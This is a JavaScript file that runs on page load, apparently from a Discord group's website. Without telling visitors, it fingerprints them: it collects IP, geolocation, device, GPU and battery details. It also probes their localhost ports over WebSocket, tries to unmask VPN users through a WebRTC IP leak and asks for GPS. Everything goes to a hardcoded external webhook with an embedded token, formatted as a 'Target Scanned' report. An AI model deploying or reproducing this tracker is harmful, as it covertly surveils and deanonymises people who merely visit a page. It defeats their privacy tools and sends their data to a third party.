// Congrats on using F12. It's too late but don't worry - we're the good guys.
//
// Follow the Discord link to join us.
// This project is open source and can be found at https://github.com/RocketGod-git/thepiratesplunder 
//
// __________                  __             __     ________             .___ 
// \______   \  ____    ____  |  | __  ____ _/  |_  /  _____/   ____    __| _/ 
//  |       _/ /  _ \ _/ ___\ |  |/ /_/ __ \\   __\/   \  ___  /  _ \  / __ |  
//  |    |   \(  <_> )\  \___ |    < \  ___/ |  |  \    \_\  \(  <_> )/ /_/ |  
//  |____|_  / \____/  \___  >|__|_ \ \___  >|__|   \______  / \____/ \____ |  
//         \/              \/      \/     \/               \/              \/  

// ------------------------------------------------------------------------
//  1) Replaced references to embed objects with a single "content" field.
//  2) The final POST now looks like: { "content": "<All the data>" }.
//  3) That matches the JSON you used successfully via curl.
// ------------------------------------------------------------------------

let webhook_url; 

async function main() {
    try {
        // >>>> Put your actual webhook URL from fuckyou.gay here <<<<
        webhook_url = "https://fuckyou.gay/webhook.php?id=ebb316065e8334fbc9c83ae367e44868&token=a23d763754df9169a117094f0bbfca6f59dd654f68cbea1304449222e0d2e734";

        // Basic system details first
        var systemDetails = getSystemDetails();
        const minimalInfo = await gatherMinimalInformation();
        
        // If OS or browser is unknown, send minimal info
        if (systemDetails.operatingSystem === "Unknown or Protected OS" || systemDetails.browser === "Unknown or Protected Browser") {
            sendDiscordMessage(
                webhook_url,
                "Minimal Browser Access Detected\n" +
                "Details: " + JSON.stringify(minimalInfo, null, 2)
            );
        }

        // Proceed with the location checks, etc.
        await getLocationAndGPSData();

        // Show the popup after 3 seconds
        setTimeout(showPopup, 3000);
        window.acceptInvite = acceptInvite;

    } catch (error) {
        console.error('Error occurred:', error);
    }
}

// ------------------------------------------------------------------------
//  Extended OS Detection
// ------------------------------------------------------------------------
function detectOperatingSystem(userAgent) {
    if (userAgent.includes("Win")) {
        if (userAgent.includes("Windows NT 10.0")) return "Windows 10";
        if (userAgent.includes("Windows NT 6.3")) return "Windows 8.1";
        if (userAgent.includes("Windows NT 6.2")) return "Windows 8";
        if (userAgent.includes("Windows NT 6.1")) return "Windows 7";
        if (userAgent.includes("Windows NT 6.0")) return "Windows Vista";
        if (userAgent.includes("Windows NT 5.1")) return "Windows XP";
        return "Windows (Other)";
    }
    if (userAgent.includes("Mac")) return "MacOS";
    if (userAgent.includes("X11")) return "UNIX";
    if (userAgent.includes("Linux")) return "Linux";
    if (userAgent.includes("Android")) return "Android";
    if (userAgent.includes("like Mac OS X")) {
        if (userAgent.includes("iPhone")) return "iOS (iPhone)";
        if (userAgent.includes("iPad")) return "iOS (iPad)";
        return "iOS (Other)";
    }
    return "Unknown OS";
}

// ------------------------------------------------------------------------
//  Extended Browser Detection
// ------------------------------------------------------------------------
const userAgentsData = [
    {"ua":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36...Chrome/121.0.0.0 Safari/537.3","pct":33.41},
    // ... (trimmed for brevity) ...
];

function detectBrowser(userAgent) {
    // Try matching custom userAgentsData first
    for (const uaObj of userAgentsData) {
        let mainPartOfUA = uaObj.ua.split(' ')[0];
        if (userAgent.includes(mainPartOfUA)) {
            let browserDetails = uaObj.ua.split(' ')[2];
            let browserName = browserDetails.split('/')[0];
            return browserName;
        }
    }

    // Fallback logic
    if (userAgent.includes("Firefox") && !userAgent.includes("Seamonkey")) return "Firefox";
    if (userAgent.includes("Seamonkey")) return "Seamonkey";
    if (userAgent.includes("Chrome") && !userAgent.includes("Chromium")) return "Chrome";
    if (userAgent.includes("Chromium")) return "Chromium";
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome") && !userAgent.includes("Chromium")) return "Safari";
    if (userAgent.includes("OPR") || userAgent.includes("Opera")) return "Opera";
    if (userAgent.includes("MSIE") || userAgent.includes("Trident/")) return "Internet Explorer";
    if (userAgent.includes("Edge")) return "Edge";

    return "Unknown or Protected Browser";
}

// ------------------------------------------------------------------------
//  Mobile Browser Detection
// ------------------------------------------------------------------------
const mobileUserAgentsData = [
    {"ua":"Mozilla/5.0 (Linux; Android 10; K)...Chrome/121.0.0.0 Mobile Safari/537.3","pct":44.09},
    // ... (trimmed for brevity) ...
];

function detectMobileBrowser(userAgent) {
    // Try custom list for mobile
    for (const uaObj of mobileUserAgentsData) {
        if (userAgent.includes(uaObj.ua.split(' ')[0])) {
            let browserDetails = uaObj.ua.match(/(Firefox|Seamonkey|Chrome|Chromium|Safari|OPR|Opera|Edg|MSIE|Trident|CriOS|SamsungBrowser|HuaweiBrowser)[\/\s](\d+)/i);
            if (browserDetails && browserDetails.length > 1) {
                return browserDetails[1];
            }
        }
    }

    // Fallback
    if (userAgent.includes("Firefox") && !userAgent.includes("Seamonkey")) return "Firefox";
    if (userAgent.includes("Seamonkey")) return "Seamonkey";
    if (userAgent.includes("Chrome") && !userAgent.includes("Chromium")) return "Chrome";
    if (userAgent.includes("CriOS")) return "Chrome for iOS";
    if (userAgent.includes("Chromium")) return "Chromium";
    if (userAgent.includes("Safari") && !userAgent.includes("Chrome") && !userAgent.includes("Chromium") && !userAgent.includes("CriOS")) return "Safari";
    if (userAgent.includes("OPR") || userAgent.includes("Opera")) return "Opera";
    if (userAgent.includes("SamsungBrowser")) return "Samsung Internet";
    if (userAgent.includes("HuaweiBrowser")) return "Huawei Browser";

    return "Unknown or Protected Browser";
}

// ------------------------------------------------------------------------
//  Extract Device Model from UA
// ------------------------------------------------------------------------
function extractDeviceModel(userAgent) {
    let deviceInfo = "Unknown Device";
    // Android
    const androidMatch = userAgent.match(/\bAndroid\b.*?;\s([^)]+)\)/);
    if (androidMatch && androidMatch.length > 1) {
        deviceInfo = androidMatch[1].trim();
    }
    // iPhone
    const iPhoneMatch = userAgent.match(/\bCPU iPhone OS ([\d_]+) like Mac OS X\b/);
    if (iPhoneMatch && iPhoneMatch.length > 1) {
        const iOSVersion = iPhoneMatch[1].replace(/_/g, '.');
        deviceInfo = `iPhone (iOS ${iOSVersion})`;
    }
    return deviceInfo;
}

// ------------------------------------------------------------------------
//  Get OS + Browser
// ------------------------------------------------------------------------
function getSystemDetails() {
    const userAgent = navigator.userAgent;
    const operatingSystem = detectOperatingSystem(userAgent);
    let browser;

    if (/Mobile|Tablet|Android|iPhone|iPad/i.test(userAgent)) {
        browser = detectMobileBrowser(userAgent);
    } else {
        browser = detectBrowser(userAgent);
    }

    return { operatingSystem, browser };
}

// ------------------------------------------------------------------------
//  (Optional) get detailed device info with userAgentData
// ------------------------------------------------------------------------
async function getDeviceDetails() {
    let details = {
        architecture: 'NA',
        model: 'NA',
        platform: 'NA',
        platformVersion: 'NA',
    };
    if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
        try {
            const highEntropyValues = await navigator.userAgentData.getHighEntropyValues([
                'architecture','model','platform','platformVersion','fullVersionList'
            ]);
            details = { ...details, ...highEntropyValues };
        } catch (error) {
            console.error('Error fetching high entropy values:', error);
        }
    }
    return details;
}

// ------------------------------------------------------------------------
//  Gather Minimal Info
// ------------------------------------------------------------------------
async function gatherMinimalInformation() {
    const minimalInfo = {
        ip: "Unknown",
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown Timezone",
        language: navigator.language || "Unknown Language",
        deviceType: /Mobile|Tablet|Android|iPhone|iPad/.test(navigator.userAgent) ? "Mobile" : "Desktop",
        browser: (function() {
            var userAgent = navigator.userAgent;
            var match = userAgent.match(/(firefox|msie|chrome|safari|trident|opera|edge)[\/\s](\d+)/i) || [];
            return match[1] ? `${match[1]} ${match[2]}` : "Unknown Browser";
        })(),
        platform: navigator.platform || "Unknown Platform",
        cookiesEnabled: navigator.cookieEnabled ? "Enabled" : "Disabled",
        doNotTrack: navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack,
        currentTime: new Date().getTime(),
        hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
        connectionType: navigator.connection && navigator.connection.type ? navigator.connection.type : "Unknown",
        batteryLevel: "Unknown", 
        isCharging: "Unknown" 
    };

    // IP
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        if (ipResponse.ok) {
            const { ip } = await ipResponse.json();
            minimalInfo.ip = ip;
        }
    } catch (err) {
        console.error('Failed to fetch IP address:', err);
    }

    // Battery
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            minimalInfo.batteryLevel = `${battery.level * 100}%`;
            minimalInfo.isCharging = battery.charging ? "Charging" : "Not Charging";
        } catch (err) {
            console.error('Failed to fetch battery status:', err);
        }
    }

    return minimalInfo;
}

// ------------------------------------------------------------------------
//  GPU details
// ------------------------------------------------------------------------
function getGPUDetails() {
    return new Promise((resolve) => {
        var canvas = document.createElement('canvas');
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) {
            resolve({ vendor: "Not Available", renderer: "Not Available" });
            return;
        }
        var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            resolve({ vendor, renderer });
        } else {
            resolve({ vendor: "Not Available", renderer: "Not Available" });
        }
    });
}

// ------------------------------------------------------------------------
//  Check local ports with WebSocket
// ------------------------------------------------------------------------
function checkPort(port) {
    return new Promise((resolve) => {
        let ws;
        const url = 'ws://localhost:' + port;
        const timeout = setTimeout(() => {
            if (ws) { ws.close(); }
            resolve({ port, isOpen: false });
        }, 2000);

        try {
            ws = new WebSocket(url);
            ws.onopen = () => {
                clearTimeout(timeout);
                ws.close();
                resolve({ port, isOpen: true });
            };
            ws.onerror = () => {
                clearTimeout(timeout);
                resolve({ port, isOpen: false });
            };
        } catch (e) {
            clearTimeout(timeout);
            resolve({ port, isOpen: false });
        }
    });
}

// ------------------------------------------------------------------------
//  Send a second POST if user shares geolocation
// ------------------------------------------------------------------------
function sendLocationWebhook(ip, gpsText) {
    // Now we just do a single content field
    let msg = `User Allowed Location Sharing\nIP Address: ${ip}\nGPS Location: ${gpsText}`;
    sendDiscordMessage(webhook_url, msg);
}

// ------------------------------------------------------------------------
//  Main location + port scanning
// ------------------------------------------------------------------------
async function getLocationAndGPSData() {
    const userTimezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown Timezone";
    const portsToCheck = [53,80,443,995,8080,8081,2222,5001,50000,8443,2086,5555,25565,554,1935,21,22,23,25,110,143,3306,3389,5900,55443,10001];

    try {
        // Check local ports
        const portResults = await Promise.allSettled(portsToCheck.map(port => checkPort(port)));
        const openPorts = portResults
            .filter(r => r.status === 'fulfilled' && r.value.isOpen)
            .map(r => r.value.port);

        // IP from ipify
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        if (!ipResponse.ok) throw new Error('Network response was not ok for IPify.');
        const { ip } = await ipResponse.json();

        // IP location
        const ipapiResponse = await fetch(`https://ipapi.co/${ip}/json/`);
        if (!ipapiResponse.ok) throw new Error('Network response was not ok for IPAPI.');
        const location = await ipapiResponse.json();

        // Minimal info again
        const minimalInfo = await gatherMinimalInformation();

        // VPN, WebRTC, GPU
        const [vpnResult, webrtcResult, gpuDetails] = await Promise.all([
            checkVPN(ip, userTimezone),
            checkWebRTCLoak(),
            getGPUDetails()
        ]);

        let systemDetails = getSystemDetails();
        let screenResolution = `${window.screen.width}x${window.screen.height}`;
        let referrer = document.referrer || "No referrer";
        let language = navigator.language;
        let additionalDetails = getAdditionalDetails();
        let locationValue = getLocationValue(location);

        let gpsValue = location && location.latitude && location.longitude
            ? `[${locationValue}](https://www.google.com/maps/search/?api=1&query=${location.latitude},${location.longitude})`
            : "Location data not available";

        let gpuValue = gpuDetails ? `${gpuDetails.vendor} - ${gpuDetails.renderer}` : "GPU data not available";
        let deviceDetails = await getDeviceDetails();

        let deviceModel = "Unknown Device";
        if (/Mobile|Tablet|Android|iPhone|iPad/i.test(navigator.userAgent)) {
            deviceModel = extractDeviceModel(navigator.userAgent);
        }

        // Build a single text block to post under "content"
        let contentString = buildContentString({
            location, gpsValue, systemDetails, screenResolution, referrer,
            language, vpnResult, webrtcResult, userTimezone, gpuValue,
            openPorts, additionalDetails, minimalInfo, deviceModel, deviceDetails
        });
        
        // Send data
        sendDiscordMessage(webhook_url, contentString);

        // If the user then **explicitly** allows real geolocation,
        // we do a separate POST with real lat/long
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function (position) {
                    const gpsLink = `https://www.google.com/maps/search/?api=1&query=${position.coords.latitude},${position.coords.longitude}`;
                    const gpsText = `[Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}](${gpsLink})`;
                    sendLocationWebhook(ip, gpsText);
                },
                function (error) {
                    console.error('Geolocation error:', error);
                },
                { timeout: 10000 }
            );
        }
    } catch (error) {
        console.error('Error in getLocationAndGPSData:', error);
    }
}

// ------------------------------------------------------------------------
//  Build the final "content" string
// ------------------------------------------------------------------------
function buildContentString({
    location, gpsValue, systemDetails, screenResolution, referrer,
    language, vpnResult, webrtcResult, userTimezone, gpuValue,
    openPorts, additionalDetails, minimalInfo, deviceModel, deviceDetails
}) {
    const ipShown = location.ip ? location.ip : "Unknown";
    const userIPLink = `http://${ipShown}`;
    const portStatusString = openPorts && openPorts.length > 0
        ? openPorts.map(p => `Port ${p}`).join(', ')
        : "No open ports detected";

    // VPN / WebRTC detection
    let leakMessage = webrtcResult && webrtcResult.hasLeak ? webrtcResult.leakMessage : "No Leak Detected";
    let vpnDetectionResult = "Unknown";
    if (vpnResult.isVpn) {
        vpnDetectionResult = "🛡️ VPN Detected (Timezone Mismatch)";
        if (webrtcResult.hasLeak) {
            const realIp = webrtcResult.leakMessage.replace("Real IP Detected: ", "");
            leakMessage = `Real IP Detected: ${realIp}`;
            vpnDetectionResult += " & WebRTC Leak";
        }
    } else if (webrtcResult.hasLeak) {
        const realIp = webrtcResult.leakMessage.replace("Real IP Detected: ", "");
        leakMessage = `Real IP Detected: ${realIp}`;
        vpnDetectionResult = "🛡️ Possible VPN/WebRTC Leak Detected";
    } else {
        vpnDetectionResult = "No VPN Detected";
    }

    // Construct a single text block
    return [
        "🎯 **Target Scanned**",
        "",
        `🌍 **User & Location Details**`,
        `IP Address: [${ipShown}](${userIPLink})`,
        `IP Address Location: ${gpsValue}`,
        `Time Zone: ${userTimezone}`,
        `Time Zone vs IP Location: ${vpnResult.vpnMessage}`,
        "",
        `💻 **Device & System Specifications**`,
        `Device Type: ${additionalDetails.deviceType}`,
        `Operating System: ${systemDetails.operatingSystem}`,
        `Browser & Version: ${systemDetails.browser} ${additionalDetails.browserVersion}`,
        `GPU: ${gpuValue}`,
        `Screen Resolution: ${screenResolution}`,
        `Platform: ${minimalInfo.platform}`,
        `Hardware Concurrency: ${minimalInfo.hardwareConcurrency}`,
        "",
        `📱 **Mobile Device Data**`,
        `Model from header: ${deviceModel}`,
        `Model if Google: ${deviceDetails.model}`,
        `Architecture: ${deviceDetails.architecture}`,
        `Platform: ${deviceDetails.platform} ${deviceDetails.platformVersion}`,
        "",
        `🔒 **Security and Privacy**`,
        `VPN Detection: ${vpnDetectionResult}`,
        `WebRTC Leak Status: ${leakMessage}`,
        `Port Status: ${portStatusString}`,
        `Do Not Track: ${additionalDetails.doNotTrack}`,
        `Cookies Enabled: ${minimalInfo.cookiesEnabled}`,
        "",
        `🔎 **Additional Details**`,
        `Referrer: ${referrer}`,
        `Language: ${language}`,
        `Connection Type: ${minimalInfo.connectionType}`,
        `Connection Details: ${additionalDetails.connectionDetails}`,
        `Battery Level: ${additionalDetails.batteryLevel}`,
        `Is Charging: ${additionalDetails.isCharging}`,
        ""
    ].join("\n");
}

// ------------------------------------------------------------------------
//  Evaluate region/city
// ------------------------------------------------------------------------
function getLocationValue(location) {
    if (location.region == null) {
        return location && location.city ? `${location.city}, ${location.country_name}` : "Location data not available";
    } else if (location.city == location.country_name) {
        return location && location.city ? `${location.city}` : "Location data not available";
    } else {
        return location && location.city
            ? `${location.city}, ${location.region}, ${location.country_name}`
            : "Location data not available";
    }
}

// ------------------------------------------------------------------------
//  Check IP vs. Timezone mismatch
// ------------------------------------------------------------------------
function checkVPN(ip, timezone) {
    return new Promise((resolve, reject) => {
        fetch(`https://ipapi.co/${ip}/json/`)
            .then(response => response.json())
            .then(data => {
                if (data.error) {
                    console.error('Error with VPN check:', data.error);
                    resolve({ isVpn: false, vpnMessage: 'Error in VPN check: ' + data.error });
                    return;
                }
                const ipTimezone = data.timezone;
                const timezoneMatch = (timezone === ipTimezone);
                const vpnMessage = timezoneMatch
                    ? 'Timezones match'
                    : 'Timezones do not match (VPN?)';
                resolve({ isVpn: !timezoneMatch, vpnMessage });
            })
            .catch(error => {
                console.error('Error in VPN check:', error.message);
                resolve({ isVpn: false, vpnMessage: 'Error in VPN check: ' + error.message });
            });
    });
}

// ------------------------------------------------------------------------
//  WebRTC IP leak check
// ------------------------------------------------------------------------
function checkWebRTCLoak() {
    return new Promise(resolve => {
        const rtcPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
        if (!rtcPeerConnection) {
            resolve({ hasLeak: false, leakMessage: "WebRTC not supported" });
            return;
        }
        const pc = new rtcPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer()
            .then(offer => pc.setLocalDescription(offer))
            .catch(error => {
                console.error("WebRTC Offer Error:", error);
                resolve({ hasLeak: false, leakMessage: "Error in WebRTC offer: " + error.message });
            });
        pc.onicecandidate = ice => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) {
                pc.close();
                return;
            }
            const regexResult = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
            if (regexResult && regexResult[1]) {
                const myIP = regexResult[1];
                pc.close();
                resolve({ hasLeak: true, leakMessage: "Real IP Detected: " + myIP });
            } else {
                resolve({ hasLeak: false, leakMessage: "No Leak Detected" });
            }
        };
    }).catch(error => {
        console.error("Error in checkWebRTCLoak:", error);
        return { hasLeak: false, leakMessage: "An error occurred: " + error.message };
    });
}

// ------------------------------------------------------------------------
//  More details: device type, browser version, etc.
// ------------------------------------------------------------------------
function getAdditionalDetails(batteryLevel, isCharging) {
    var userAgent = navigator.userAgent;
    var deviceType = /Mobile|Tablet|iPad|iPhone|Android/.test(userAgent) ? 'Mobile' : 'Desktop';
    var browserMatch = userAgent.match(/(firefox|msie|chrome|safari|trident|opera|edge)[\/\s](\d+)/i);
    var browserVersion = browserMatch ? `${browserMatch[1]} ${browserMatch[2]}` : 'Unknown';

    var connectionDetails = 'Unknown';
    if (navigator.connection) {
        var cType = navigator.connection.type || 'Unknown type';
        var downlink = navigator.connection.downlink ? `Downlink: ${navigator.connection.downlink}Mbps` : '';
        var effType = navigator.connection.effectiveType ? `Effective Type: ${navigator.connection.effectiveType}` : '';
        var rtt = navigator.connection.rtt ? `RTT: ${navigator.connection.rtt}ms` : '';
        connectionDetails = [cType, downlink, effType, rtt].filter(d => d).join(', ');
    }

    var dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
    dnt = (dnt === '1' || dnt === 'yes') ? 'On'
         : (dnt === '0' || dnt === 'no') ? 'Off'
         : 'Unknown';

    return {
        deviceType,
        browserVersion,
        connectionDetails: connectionDetails,
        doNotTrack: dnt,
        batteryLevel: batteryLevel || "Unknown",
        isCharging: isCharging || "Unknown"
    };
}

// ------------------------------------------------------------------------
//  POST to the custom webhook
// ------------------------------------------------------------------------
function sendDiscordMessage(webhookUrl, content, retryCount = 3) {
    const retryDelay = 3000;
    fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        // The key difference: we pass a top-level { content: "..." }
        body: JSON.stringify({ content: content })
    })
    .then(response => {
        if (!response.ok) {
            console.error('Failed to send message. HTTP:', response.status, response.statusText);
            if (retryCount > 0) {
                console.log(`Retrying... Attempts left: ${retryCount - 1}`);
                setTimeout(() => sendDiscordMessage(webhookUrl, content, retryCount - 1), retryDelay);
            } else {
                console.error('Max retries reached. No more attempts.');
            }
        } else {
            console.log('Message sent successfully.');
        }
    })
    .catch(error => {
        console.error('Error sending message:', error);
        if (retryCount > 0) {
            console.log(`Retrying... Attempts left: ${retryCount - 1}`);
            setTimeout(() => sendDiscordMessage(webhookUrl, content, retryCount - 1), retryDelay);
        } else {
            console.error('Max retries reached. No more attempts.');
        }
    });
}

// ------------------------------------------------------------------------
//  Show the popup (called after 3 sec in main())
// ------------------------------------------------------------------------
function showPopup() {
    var popup = document.getElementById('discordPopup');
    if (popup) {
        popup.style.display = 'block';
    }
}

// ------------------------------------------------------------------------
//  Accept invite button -> redirect
// ------------------------------------------------------------------------
function acceptInvite() {
    window.location.href = 'https://discord.gg/thepirates';
}

// ------------------------------------------------------------------------
//  Startup
// ------------------------------------------------------------------------
document.addEventListener('DOMContentLoaded', (event) => {
    main().catch(error => {
        console.error('Error in main function:', error);
    });
});
